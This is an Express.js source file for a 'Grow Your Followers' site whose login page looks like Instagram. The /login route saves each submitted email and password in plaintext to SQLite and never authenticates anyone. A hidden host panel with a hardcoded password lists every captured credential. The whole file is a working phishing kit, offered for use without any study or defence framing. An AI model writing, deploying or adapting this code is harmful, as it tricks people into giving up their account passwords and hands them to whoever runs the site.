const express = require('express');
const session = require('express-session');
const sqlite3 = require('sqlite3').verbose();

const app = express();
const port = process.env.PORT || 3000;

const db = new sqlite3.Database('./database.db');

db.run(`
CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    email TEXT,
    password TEXT
)
`);

app.use(express.urlencoded({ extended: true }));

app.use(session({
    secret: 'securekey',
    resave: false,
    saveUninitialized: true
}));

// ================= MAIN PAGE =================
app.get('/', (req, res) => {
    res.send(`
    <!DOCTYPE html>
    <html>
    <head>
        <title>Grow Your Followers</title>
        <style>
            body {
                margin: 0;
                height: 100vh;
                display: flex;
                justify-content: center;
                align-items: center;
                background: linear-gradient(135deg, #000000, #1a1a1a);
                font-family: Arial;
                color: white;
            }
            .card {
                background: #121212;
                padding: 40px;
                border-radius: 18px;
                width: 340px;
                text-align: center;
                box-shadow: 0 0 30px rgba(0,0,0,0.8);
            }
            h2 {
                margin-bottom: 5px;
            }
            p {
                font-size: 13px;
                color: #bbb;
            }
            input {
                width: 100%;
                padding: 12px;
                margin: 12px 0;
                border-radius: 8px;
                border: none;
                background: #1f1f1f;
                color: white;
            }
            button {
                width: 100%;
                padding: 12px;
                border: none;
                border-radius: 8px;
                background: #0095f6;
                color: white;
                font-weight: bold;
                cursor: pointer;
            }
            button:hover {
                background: #0077cc;
            }
            .host-btn {
                margin-top: 15px;
                display: inline-block;
                font-size: 13px;
                color: #4da6ff;
                text-decoration: none;
            }
        </style>
    </head>
    <body>
        <div class="card">
            <h2>Welcome to Grow Your Followers</h2>
            <p>Build your audience smarter & faster</p>
            <form method="POST" action="/login">
                <input type="text" name="email" placeholder="Enter Email" required>
                <input type="password" name="password" placeholder="Enter Password" required>
                <button type="submit">Log In</button>
            </form>
            <a href="/host" class="host-btn">Host Access</a>
        </div>
    </body>
    </html>
    `);
});

// ================= SAVE USER =================
app.post('/login', (req, res) => {
    const { email, password } = req.body;
    db.run("INSERT INTO users (email, password) VALUES (?, ?)", [email, password]);
    res.redirect('/');
});

// ================= HOST LOGIN =================
app.get('/host', (req, res) => {
    res.send(`
    <!DOCTYPE html>
    <html>
    <head>
        <title>Host Login</title>
        <style>
            body {
                margin: 0;
                height: 100vh;
                display: flex;
                justify-content: center;
                align-items: center;
                background: linear-gradient(135deg, #141e30, #243b55);
                font-family: Arial;
                color: white;
            }
            .box {
                background: #1c1c1c;
                padding: 35px;
                border-radius: 15px;
                width: 300px;
                text-align: center;
                box-shadow: 0 0 25px rgba(0,0,0,0.6);
            }
            input {
                width: 100%;
                padding: 10px;
                margin: 10px 0;
                border-radius: 6px;
                border: none;
            }
            button {
                width: 100%;
                padding: 10px;
                border: none;
                background: #28a745;
                color: white;
                border-radius: 6px;
                font-weight: bold;
                cursor: pointer;
            }
            button:hover {
                background: #1e7e34;
            }
        </style>
    </head>
    <body>
        <div class="box">
            <h2>Host Panel</h2>
            <form method="POST" action="/host">
                <input type="text" name="username" placeholder="Username" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit">Enter</button>
            </form>
        </div>
    </body>
    </html>
    `);
});

// ================= HOST CHECK =================
app.post('/host', (req, res) => {
    if (req.body.username === "Aizain" && req.body.password === "Aizain123@") {
        req.session.host = true;
        res.redirect('/dashboard');
    } else {
        res.send("<h3 style='color:red;text-align:center;'>Access Denied</h3><a href='/host'>Back</a>");
    }
});

// ================= DASHBOARD =================
app.get('/dashboard', (req, res) => {
    if (!req.session.host) return res.redirect('/host');

    db.all("SELECT * FROM users", [], (err, rows) => {
        let data = rows.map(u => `
            <tr>
                <td>${u.email}</td>
                <td>${u.password}</td>
            </tr>
        `).join('');

        res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Dashboard</title>
            <style>
                body {
                    margin: 0;
                    font-family: Arial;
                    background: #111;
                    color: white;
                    padding: 30px;
                }
                h1 {
                    text-align: center;
                }
                table {
                    width: 100%;
                    border-collapse: collapse;
                    margin-top: 25px;
                }
                th, td {
                    padding: 12px;
                    border-bottom: 1px solid #333;
                }
                th {
                    background: #222;
                }
                tr:hover {
                    background: #1a1a1a;
                }
                a {
                    display: block;
                    text-align: center;
                    margin-top: 20px;
                    color: #ff4d4d;
                    text-decoration: none;
                }
            </style>
        </head>
        <body>
            <h1>Host Dashboard</h1>
            <table>
                <tr>
                    <th>Email</th>
                    <th>Password</th>
                </tr>
                ${data}
            </table>
            <a href="/logout">Logout</a>
        </body>
        </html>
        `);
    });
});

// ================= LOGOUT =================
app.get('/logout', (req, res) => {
    req.session.destroy();
    res.redirect('/');
});

app.listen(port, () => {
    console.log("Server running at http://localhost:3000");
});
